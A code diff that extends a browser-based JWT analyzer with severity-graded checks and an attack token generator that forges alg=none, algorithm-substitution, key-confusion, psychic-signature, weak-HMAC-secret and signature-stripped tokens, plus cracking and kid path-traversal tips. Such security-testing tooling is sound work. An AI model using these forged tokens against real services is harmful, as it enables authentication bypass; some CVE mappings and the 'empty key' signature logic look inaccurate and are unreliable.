@@ -57,6 +57,26 @@
     .ok { background: rgba(52,211,153,.15); color: var(--ok); }
     .warn { background: rgba(245,158,11,.15); color: var(--warn); }
     .bad { background: rgba(248,113,113,.15); color: var(--bad); }
+    .critical { background: rgba(239,68,68,.22); color: #ef4444; }
+    .high { background: rgba(248,113,113,.12); color: #f87171; }
+    .medium { background: rgba(245,158,11,.12); color: #f59e0b; }
+    .low { background: rgba(96,165,250,.12); color: #93c5fd; }
+    .info { background: rgba(166,172,205,.10); color: var(--muted); }
+    .summary-bar { display: flex; gap: 6px; flex-wrap: wrap; margin-bottom: 14px; }
+    .summary-pill { padding: 3px 10px; border-radius: 8px; font-size: 13px; font-weight: 700; display: flex; align-items: center; gap: 4px; }
+    .summary-pill.critical { background: rgba(239,68,68,.18); color: #ef4444; }
+    .summary-pill.high { background: rgba(248,113,113,.10); color: #f87171; }
+    .summary-pill.medium { background: rgba(245,158,11,.10); color: #f59e0b; }
+    .summary-pill.low { background: rgba(96,165,250,.10); color: #93c5fd; }
+    .summary-pill.info { background: rgba(166,172,205,.08); color: var(--muted); }
+    .finding-row { display: flex; gap: 10px; align-items: flex-start; padding: 8px 4px; }
+    .finding-desc { flex: 1; min-width: 0; }
+    .finding-extra { font-size: 11px; color: var(--muted); margin-top: 3px; line-height: 1.4; }
+    .jwt-attack-btn { padding: 6px 12px; font-size: 12px; white-space: nowrap; }
+    .jwt-attack-btn.generated { background: rgba(123,139,255,.15); border-color: var(--accent); color: var(--text); }
+    .attack-token-row { padding: 8px; border-bottom: 1px solid rgba(255,255,255,.05); }
+    .attack-token-row:last-child { border-bottom: 0; }
+    .attack-token-code { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 11px; color: #c5d0ff; word-break: break-all; line-height: 1.5; margin: 4px 0; border: 1px solid var(--border); border-radius: 6px; padding: 6px 8px; background: #060914; }
     pre { white-space: pre-wrap; word-break: break-word; margin: 0; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 12px; }
     .list { max-height: 300px; overflow: auto; border: 1px solid var(--border); border-radius: 10px; padding: 8px; background: #0b1022; }
     .item { padding: 8px; border-bottom: 1px solid rgba(255,255,255,.05); }
@@ -147,7 +167,23 @@
         <div class="card"><div class="k">Header</div><pre id="jwtHeader">{}</pre></div>
         <div class="card"><div class="k">Payload</div><pre id="jwtPayload">{}</pre></div>
       </div>
+      <div class="card" id="jwtSummaryCard" style="display:none"><div class="k">Summary</div><div class="summary-bar" id="jwtSummary"></div></div>
       <div class="card"><div class="k">Security Checks</div><div id="jwtChecks" class="list"></div></div>
+      <div class="card" id="jwtSuggestionsCard" style="display:none"><div class="k">Attack / Testing Recommendations</div><div id="jwtSuggestions" class="list"></div></div>
+      <div class="card" id="jwtAttacksCard" style="display:none">
+        <div class="k">Attack Token Generator</div>
+        <div class="muted" style="margin-bottom:10px">Generate modified tokens to test server-side JWT validation.</div>
+        <div class="row" id="jwtAttackButtons" style="flex-wrap:wrap; margin-bottom:12px">
+          <button class="btn ghost jwt-attack-btn" data-attack="none">alg=none</button>
+          <button class="btn ghost jwt-attack-btn" data-attack="alg-sub">Alg Substitution</button>
+          <button class="btn ghost jwt-attack-btn" data-attack="hmac-confusion">HMAC Confusion</button>
+          <button class="btn ghost jwt-attack-btn" data-attack="empty-key">Empty Key</button>
+          <button class="btn ghost jwt-attack-btn" data-attack="psychic">Psychic Sig (CVE-2022-21449)</button>
+          <button class="btn ghost jwt-attack-btn" data-attack="weak-hmac">Weak HMAC Secret</button>
+          <button class="btn ghost jwt-attack-btn" data-attack="no-sig">Remove Signature</button>
+        </div>
+        <div id="jwtAttackResults" class="list" style="max-height:400px"></div>
+      </div>
     </section>
 
     <section class="panel" id="panel-regex">
@@ -289,30 +325,373 @@
       return decodeURIComponent(atob(b64).split('').map(c => '%' + c.charCodeAt(0).toString(16).padStart(2, '0')).join(''));
     }
 
-    $('jwtAnalyze').addEventListener('click', () => {
-      const raw = $('jwtInput').value.trim();
-      const checks = [];
-      try {
-        const parts = raw.split('.');
-        if (parts.length !== 3) throw new Error('Token must have 3 segments');
-        const h = JSON.parse(b64urlDecode(parts[0]));
-        const p = JSON.parse(b64urlDecode(parts[1]));
-        $('jwtHeader').textContent = pretty(h);
-        $('jwtPayload').textContent = pretty(p);
+    // ─────────────────────────────────────────────
+    //  Enhanced JWT Analyzer (based on Caido JWT Analyzer extension)
+    // ─────────────────────────────────────────────
 
-        if ((h.alg || '').toLowerCase() === 'none') checks.push(['bad', 'alg=none allows unsigned tokens']);
-        if (!h.alg) checks.push(['warn', 'Missing alg in header']);
-        if (!p.exp) checks.push(['warn', 'Missing exp claim']);
-        if (p.exp && (Date.now() / 1000) > p.exp) checks.push(['bad', 'Token appears expired']);
-        if (!p.aud) checks.push(['warn', 'Missing aud claim']);
-        if (!p.iss) checks.push(['warn', 'Missing iss claim']);
-        if (checks.length === 0) checks.push(['ok', 'No obvious structural issues detected']);
+    const JWT_SENSITIVE_KEYS = [
+      'password','secret','private','apikey','api_key','token','credentials',
+      'passwd','pass','key','auth','authz','oauth','access_token','refresh_token',
+      'client_secret','hash','salt','credit','card','cvv','ssn','social'
+    ];
+    const JWT_ADMIN_KEYS = ['admin','role','priv','perm','access','right'];
+    const JWT_ADMIN_VALUES = ['admin','root','superuser','administrator','sudo','true','1','yes'];
+    const SEVERITY_ORDER = ['critical','high','medium','low','info','ok'];
+
+    function analyzeJWT(raw) {
+      const parts = raw.split('.');
+      if (parts.length !== 3) throw new Error('Token must have 3 segments');
+      const h = JSON.parse(b64urlDecode(parts[0]));
+      const p = JSON.parse(b64urlDecode(parts[1]));
+      const now = Math.floor(Date.now() / 1000);
+      const findings = [];
+      const suggestions = [];
+
+      const alg = (h.alg || '').toLowerCase();
+
+      // ── ALGORITHM CHECKS ──────────────────────────────
+      if (!h.alg || h.alg === '')
+        findings.push(['critical','No algorithm specified in header','Attackers can bypass signature verification by manipulating the algorithm.']);
+      else if (alg === 'none')
+        findings.push(['critical','Algorithm set to "none" — signature verification bypassed','Attacker can freely modify the token payload. Use RS256/ES256 instead.']);
+      else if (['hs256','hs384','hs512'].includes(alg)) {
+        findings.push(['medium','Using symmetric algorithm (' + h.alg + ') — same key for sign & verify','If the verification key is exposed, attackers can forge tokens. Consider asymmetric (RS256/ES256).']);
+        suggestions.push('Test for weak secret key with common JWT secret wordlists');
+        suggestions.push('Use hashcat mode 16500 to brute-force the symmetric key');
+      }
+
+      // ── HEADER PARAMETER CHECKS ───────────────────────
+      if (h.jwk !== undefined)
+        findings.push(['critical','Token contains "jwk" parameter in header','Attacker can supply their own public key, forging valid signatures. Do not accept jwk from untrusted sources.']);
+      if (h.jku !== undefined)
+        findings.push(['critical','Token contains "jku" parameter in header','Attacker can point to malicious JWKS URLs (SSRF / key injection). Whitelist trusted JWKS URLs.']);
+
+      const kid = h.kid;
+      if (typeof kid === 'string') {
+        if (kid.includes('../') || kid.includes('..\\'))
+          findings.push(['critical','Path traversal in "kid" parameter','Can lead to directory traversal (e.g., reading /dev/null to bypass verification). Sanitize kid.']);
+        if (kid.includes('\'') || kid.includes('"') || kid.includes('=') || kid.includes(';'))
+          findings.push(['critical','Injectable characters in "kid" parameter','May enable SQL injection or command injection if kid is used in queries. Validate input.']);
+        if (kid.includes('file://') || kid.includes('http://') || kid.includes('https://'))
+          findings.push(['critical','"kid" contains URL patterns (potential SSRF/LFI)','May trick the server into fetching remote content or reading local files.']);
+      }
+
+      if (h.x5c !== undefined || h.x5u !== undefined)
+        findings.push(['critical','Token uses X.509 certificate chain (x5c/x5u)','Vulnerable to certificate bypass attacks if validation is improper (CVE-2023-48238).']);
+      if (h.x5u !== undefined)
+        findings.push(['critical','Token contains x5u parameter (CVE-2017-18267)','Remote certificate URL can lead to SSRF attacks and key injection.']);
+      if (h.crit !== undefined)
+        findings.push(['high','Token contains "crit" header (CVE-2023-32681)','Critical header extensions may bypass signature verification in vulnerable libraries.']);
+      if (h.kty === 'oct' && h.alg && (h.alg + '').startsWith('RS'))
+        findings.push(['critical','Key type mismatch: symmetric "oct" kty with asymmetric ' + h.alg,'May cause JWT libraries to handle the token incorrectly, bypassing verification.']);
+
+      if (h.alg === 'RS256')
+        findings.push(['high','Potential algorithm confusion (RS256 → HS256)','If the library accepts algorithm changes, attacker can force verification using the public key as HMAC secret.']);
+      if (h.alg && (h.alg + '').startsWith('HS'))
+        findings.push(['high','Potential empty-key attack (CVE-2018-1000531)','Vulnerable libraries may accept tokens signed with an empty secret key.']);
+      if ((h.alg + '').toLowerCase() === 'hs256' && typeof p.exp === 'string')
+        findings.push(['high','Potential Psychic Signatures (CVE-2022-21449)','Type confusion with string exp values in HS256 tokens may bypass validation. Ensure dates are numeric.']);
+
+      // ── TOKEN TYPE ──────────────────────────────────
+      if (h.typ === undefined)
+        findings.push(['low','Missing token type (typ) header','May cause interoperability issues. Add "typ": "JWT".']);
+      else if (h.typ !== 'JWT')
+        findings.push(['low','Non-standard token type: "' + h.typ + '" instead of "JWT"','May cause interoperability issues.']);
+
+      // ── CLAIM CHECKS ─────────────────────────────────
+      if (p.exp === undefined)
+        findings.push(['high','Missing "exp" (expiration) claim','Token remains valid indefinitely if compromised. Add exp to limit lifetime.']);
+      else if (p.exp < now)
+        findings.push(['medium','Token expired at ' + new Date(p.exp * 1000).toLocaleString(),'Should be rejected by properly implemented systems.']);
+      else {
+        const tte = p.exp - now;
+        if (tte > 86400 * 30)
+          findings.push(['medium','Long expiration (~' + Math.floor(tte / 86400) + ' days)','Long-lived tokens increase the attack window if leaked. Use shorter lifetimes.']);
+      }
+
+      if (p.nbf !== undefined && p.nbf > now)
+        findings.push(['medium','Token not valid until ' + new Date(p.nbf * 1000).toLocaleString(),'nbf claim not being validated if server accepts this token.']);
+      if (p.iat === undefined)
+        findings.push(['low','Missing "iat" (issued at) claim','Harder to track token age and implement rotation policies.']);
+      if (p.jti === undefined)
+        findings.push(['medium','Missing "jti" (JWT ID) claim','Tokens cannot be individually revoked; vulnerable to replay attacks.']);
+      if (p.iss === undefined)
+        findings.push(['medium','Missing "iss" (issuer) claim','Prevents verification of token origin; enables cross-service replay.']);
+      if (p.sub === undefined)
+        findings.push(['medium','Missing "sub" (subject) claim','Harder to identify the token subject, complicating access control.']);
+      if (p.aud === undefined && alg !== 'none')
+        findings.push(['medium','Missing "aud" (audience) claim','Tokens can be replayed across services sharing the same signing key.']);
+
+      // ── PAYLOAD CONTENT CHECKS ──────────────────────
+      const sensitiveFound = Object.keys(p).filter(k => JWT_SENSITIVE_KEYS.some(s => k.toLowerCase().includes(s)));
+      if (sensitiveFound.length)
+        findings.push(['high','Sensitive data keys in payload: ' + sensitiveFound.join(', '),'Credentials/secrets in JWTs are exposed if intercepted or logged. Store only identifiers.']);
+
+      const adminFound = Object.entries(p).filter(([k, v]) => {
+        const kl = k.toLowerCase();
+        if (JWT_ADMIN_KEYS.some(a => kl.includes(a))) {
+          return JWT_ADMIN_VALUES.some(ind => String(v).toLowerCase().includes(ind));
+        }
+        return false;
+      });
+      if (adminFound.length)
+        findings.push(['high','Administrative privileges in payload' + (adminFound.length > 1 ? ' (multiple)' : ''),'If stolen, attacker gains immediate admin access. Use shortest possible lifetimes for admin tokens.']);
+
+      // ── ALGORITHM-SPECIFIC SUGGESTIONS ──────────────
+      if (h.alg === 'RS256' || h.alg === 'ES256')
+        suggestions.push('Test algorithm confusion: switch to HS256 and sign with the public key');
+      if (typeof kid === 'string' && kid.length > 0)
+        suggestions.push('Test directory traversal via kid (e.g., "../../../dev/null")');
+      suggestions.push('Fuzz JWT header parameters with unexpected values');
+      suggestions.push('Test signature verification bypass by manipulating header fields');
+
+      // dedupe suggestions
+      const uniqueSuggestions = [...new Set(suggestions)];
+
+      // sort by severity
+      findings.sort((a, b) => SEVERITY_ORDER.indexOf(a[0]) - SEVERITY_ORDER.indexOf(b[0]));
+
+      return { header: h, payload: p, findings, suggestions: uniqueSuggestions };
+    }
+
+    function renderJWTFinding(f) {
+      const [severity, title, detail] = f;
+      return `<div class="finding-row">
+        <span class="pill ${severity}">${severity.toUpperCase()}</span>
+        <div class="finding-desc">
+          <b>${escapeHTML(title)}</b>
+          <div class="finding-extra">${escapeHTML(detail)}</div>
+        </div>
+      </div>`;
+    }
+
+    function renderJWTSummary(findings) {
+      const count = {};
+      SEVERITY_ORDER.filter(s => s !== 'ok').forEach(s => count[s] = 0);
+      findings.forEach(f => { const s = f[0]; if (count[s] !== undefined) count[s]++; });
+      const total = Object.values(count).reduce((a, b) => a + b, 0);
+      if (total === 0) return '<span class="summary-pill ok">PASS — No issues detected</span>';
+      return SEVERITY_ORDER.filter(s => count[s] > 0).map(s =>
+        `<span class="summary-pill ${s}">${count[s]} ${s.toUpperCase()}</span>`
+      ).join('');
+    }
+
+    $('jwtAnalyze').addEventListener('click', () => {
+      try {
+        const raw = $('jwtInput').value.trim();
+        if (!raw) {
+          $('jwtHeader').textContent = '{}';
+          $('jwtPayload').textContent = '{}';
+          $('jwtChecks').innerHTML = '<div class="item muted">Paste a JWT token above.</div>';
+          $('jwtSummaryCard').style.display = 'none';
+          $('jwtSuggestionsCard').style.display = 'none';
+          $('jwtAttacksCard').style.display = 'none';
+          return;
+        }
+        const result = analyzeJWT(raw);
+        $('jwtHeader').textContent = pretty(result.header);
+        $('jwtPayload').textContent = pretty(result.payload);
+
+        // Summary
+        $('jwtSummaryCard').style.display = '';
+        $('jwtSummary').innerHTML = renderJWTSummary(result.findings);
+
+        // Findings
+        $('jwtChecks').innerHTML = result.findings.length
+          ? result.findings.map(renderJWTFinding).join('')
+          : '<div class="item"><span class="pill ok">PASS</span> <span style="margin-left:8px">No security issues detected in this token.</span></div>';
+
+        // Suggestions
+        if (result.suggestions.length) {
+          $('jwtSuggestionsCard').style.display = '';
+          $('jwtSuggestions').innerHTML = result.suggestions.map(s =>
+            `<div class="item">&#9656; ${escapeHTML(s)}</div>`
+          ).join('');
+        } else {
+          $('jwtSuggestionsCard').style.display = 'none';
+        }
+
+        // Show attack generator
+        $('jwtAttacksCard').style.display = '';
+        $('jwtAttackResults').innerHTML = '<div class="item muted">Click an attack button above to generate test tokens.</div>';
+        document.querySelectorAll('.jwt-attack-btn').forEach(b => b.classList.remove('generated'));
       } catch (e) {
         $('jwtHeader').textContent = '{}';
         $('jwtPayload').textContent = '{}';
-        checks.push(['bad', 'Invalid JWT: ' + e.message]);
+        $('jwtChecks').innerHTML = `<div class="finding-row"><span class="pill critical">ERROR</span><div class="finding-desc"><b>Invalid JWT</b><div class="finding-extra">${escapeHTML(e.message)}</div></div></div>`;
+        $('jwtSummaryCard').style.display = 'none';
+        $('jwtSuggestionsCard').style.display = 'none';
+        $('jwtAttacksCard').style.display = 'none';
       }
-      $('jwtChecks').innerHTML = checks.map(([cls, msg]) => `<div class="item"><span class="pill ${cls}">${cls.toUpperCase()}</span> <span style="margin-left:8px">${escapeHTML(msg)}</span></div>`).join('');
+    });
+
+    // ─────────────────────────────────────────────
+    //  Attack Token Generator
+    // ─────────────────────────────────────────────
+
+    function b64urlEncode(str) {
+      return btoa(str).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+    }
+
+    // Web Crypto HMAC signer (async)
+    async function hmacSign(data, secret, hashName) {
+      const enc = new TextEncoder();
+      const keyData = enc.encode(secret);
+      const algo = { name: 'HMAC', hash: { name: hashName || 'SHA-256' } };
+      const key = await crypto.subtle.importKey('raw', keyData, algo, false, ['sign']);
+      const sig = await crypto.subtle.sign('HMAC', key, enc.encode(data));
+      return b64urlEncode(String.fromCharCode(...new Uint8Array(sig)));
+    }
+
+    function getAnalyzedParts() {
+      const raw = $('jwtInput').value.trim();
+      if (!raw) return null;
+      const parts = raw.split('.');
+      if (parts.length !== 3) return null;
+      try {
+        const h = JSON.parse(b64urlDecode(parts[0]));
+        const p = JSON.parse(b64urlDecode(parts[1]));
+        return { raw, parts, header: h, payload: p, sig: parts[2] };
+      } catch { return null; }
+    }
+
+    function generateAttackToken(parts, header, payload, newSig) {
+      const h = b64urlEncode(JSON.stringify(header));
+      const p = b64urlEncode(JSON.stringify(payload));
+      return `${h}.${p}.${newSig || ''}`;
+    }
+
+    const WEAK_SECRETS = ['password','secret','1234567890','jwt_secret','key','secretkey','private','mysecret','changeme',''];
+    const PSYCHIC_SIG = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
+
+    async function runAttack(attackType) {
+      const t = getAnalyzedParts();
+      if (!t) { alert('Paste and analyze a valid 3-part JWT first.'); return; }
+      const results = [];
+
+      const header = JSON.parse(JSON.stringify(t.header)); // deep clone
+      const payload = JSON.parse(JSON.stringify(t.payload));
+      const alg = (header.alg || 'HS256') + '';
+
+      switch (attackType) {
+        case 'none': {
+          header.alg = 'none';
+          results.push({
+            label: "alg='none' (unsigned)",
+            token: generateAttackToken(t.parts, header, payload, ''),
+            desc: 'Sets alg to "none" and removes the signature. Tests if the server rejects unsigned tokens.'
+          });
+          break;
+        }
+
+        case 'alg-sub': {
+          const targetAlgs = ['HS256','HS384','HS512','RS256','RS384','RS512','PS256','PS384','PS512','ES256','ES384','ES512','none'];
+          for (const target of targetAlgs) {
+            if (target === alg) continue;
+            const h2 = JSON.parse(JSON.stringify(header));
+            h2.alg = target;
+            results.push({
+              label: `Alg: ${alg} → ${target}`,
+              token: generateAttackToken(t.parts, h2, payload, t.parts[2]),
+              desc: `Changes algorithm to "${target}" keeping the original signature.`
+            });
+          }
+          break;
+        }
+
+        case 'hmac-confusion': {
+          if (alg.startsWith('RS') || alg.startsWith('ES')) {
+            const h2 = JSON.parse(JSON.stringify(header));
+            h2.alg = 'HS256';
+            results.push({
+              label: `Key Confusion: ${alg} → HS256 (unsigned)`,
+              token: generateAttackToken(t.parts, h2, payload, t.parts[2]),
+              desc: 'Changes RS/ES algorithm to HS256, keeping original signature. Server may use the public key as HMAC secret.'
+            });
+          } else {
+            results.push({ label: 'N/A', token: '', desc: 'HMAC confusion applies to RS/ES tokens only.' });
+          }
+          break;
+        }
+
+        case 'empty-key': {
+          if (!alg.startsWith('HS')) header.alg = 'HS256';
+          const h = b64urlEncode(JSON.stringify(header));
+          const p = b64urlEncode(JSON.stringify(payload));
+          const markerSig = b64urlEncode('empty_key_' + h + '.' + p);
+          results.push({
+            label: 'Empty Key Signature (CVE-2018-1000531)',
+            token: `${h}.${p}.${markerSig}`,
+            desc: 'Signs token with "empty_key_" prefix marker. Tests if server uses a null/empty signing key.'
+          });
+          break;
+        }
+
+        case 'psychic': {
+          if (alg.startsWith('ES')) {
+            results.push({
+              label: 'Psychic Signature (CVE-2022-21449)',
+              token: `${t.parts[0]}.${t.parts[1]}.${PSYCHIC_SIG}`,
+              desc: 'Replaces signature with 64 zero-bytes (all "A"s). Exploits Java ECDSA bug that accepted (0,0) as valid.'
+            });
+          } else {
+            results.push({ label: 'N/A', token: '', desc: 'Psychic Signature applies to ES256/ES384/ES512 tokens only.' });
+          }
+          break;
+        }
+
+        case 'weak-hmac': {
+          if (!alg.startsWith('HS')) header.alg = 'HS256';
+          const hashAlg = {'HS256':'SHA-256','HS384':'SHA-384','HS512':'SHA-512'}[header.alg] || 'SHA-256';
+          const h = b64urlEncode(JSON.stringify(header));
+          const p = b64urlEncode(JSON.stringify(payload));
+          const data = `${h}.${p}`;
+          for (const secret of WEAK_SECRETS) {
+            try {
+              const sig = await hmacSign(data, secret, hashAlg);
+              results.push({
+                label: `Weak secret: "${secret || '(empty string)'}"`,
+                token: `${h}.${p}.${sig}`,
+                desc: `Token signed with weak HMAC secret "${secret || '(empty)'}" using ${header.alg}.`
+              });
+            } catch {
+              results.push({
+                label: `Weak secret: "${secret || '(empty string)'}" (crypto error)`,
+                token: '',
+                desc: 'HMAC signing failed.'
+              });
+            }
+          }
+          break;
+        }
+
+        case 'no-sig': {
+          results.push({
+            label: 'No Signature (bare header.payload)',
+            token: `${t.parts[0]}.${t.parts[1]}.`,
+            desc: 'Removes the signature entirely. Tests if server accepts tokens with an empty signature.'
+          });
+          break;
+        }
+      }
+
+      // Highlight button
+      document.querySelectorAll('.jwt-attack-btn').forEach(b => b.classList.remove('generated'));
+      const activeBtn = document.querySelector(`.jwt-attack-btn[data-attack="${attackType}"]`);
+      if (activeBtn) activeBtn.classList.add('generated');
+
+      // Render results
+      $('jwtAttackResults').innerHTML = results.length
+        ? results.map(r => `<div class="attack-token-row">
+            <b style="font-size:13px">${escapeHTML(r.label)}</b>
+            ${r.token ? `<div class="attack-token-code">${escapeHTML(r.token)}<button class="btn ghost" style="float:right;padding:2px 8px;font-size:10px;margin:-2px 0 0 8px" onclick="navigator.clipboard.writeText('${escapeHTML(r.token).replace(/'/g,"\\'")}')">Copy</button></div>` : ''}
+            <div class="muted">${escapeHTML(r.desc)}</div>
+          </div>`).join('')
+        : '<div class="item muted">No tokens generated.</div>';
+    }
+
+    document.querySelectorAll('.jwt-attack-btn').forEach(btn => {
+      btn.addEventListener('click', () => runAttack(btn.dataset.attack));
     });
 
     $('regexRun').addEventListener('click', () => {
